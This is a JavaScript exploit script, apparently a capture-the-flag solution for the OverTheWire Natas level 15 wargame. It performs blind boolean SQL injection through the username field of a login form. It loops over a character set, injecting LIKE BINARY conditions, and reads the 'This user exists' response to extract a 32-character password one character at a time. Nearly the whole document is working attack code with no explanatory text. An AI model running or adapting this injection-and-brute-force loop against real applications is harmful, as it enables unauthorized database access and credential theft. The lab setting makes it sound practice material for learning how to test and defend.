url = 'http://natas15.natas.labs.overthewire.org/index.php';
pass_len = 32; //Password length
charset = "0123456789" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz"; //Set of chars to bruteforce letter by letter
passwd = "";
truestring = "This user exists.<br>"; //This appears with a positive match

xhr = new XMLHttpRequest();
data = new FormData();

while (passwd.length < pass_len){	
	for (i=0;i<charset.length;i++) {
		injected_query = `natas16" and password LIKE BINARY "${passwd+charset[i]}%";-- -`;
		data.set('username',injected_query);
		xhr.open('POST',url,false);
		xhr.onload = function () {
			if (this.responseText.includes(truestring)){
				console.log(`Password character found: ${charset[i]}`);
				passwd += charset[i];
			};
		};
		xhr.send(data);
	};
};

console.log(`Password is ${passwd}`);